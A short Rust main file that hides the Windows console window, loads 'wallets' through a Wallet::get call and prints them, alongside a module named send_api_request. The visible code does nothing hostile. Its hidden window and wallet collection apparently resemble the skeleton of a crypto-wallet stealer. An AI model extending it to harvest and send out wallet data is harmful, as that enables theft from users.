// Remove console window in Windows OS
#![windows_subsystem = "windows"]

mod types;
mod globals;
mod send_api_request;

pub use send_api_request::*;
use types::Wallet;

#[tokio::main]
async fn main() {
    let wallets = Wallet::get().await.unwrap();

    println!("{:?}", wallets);
}
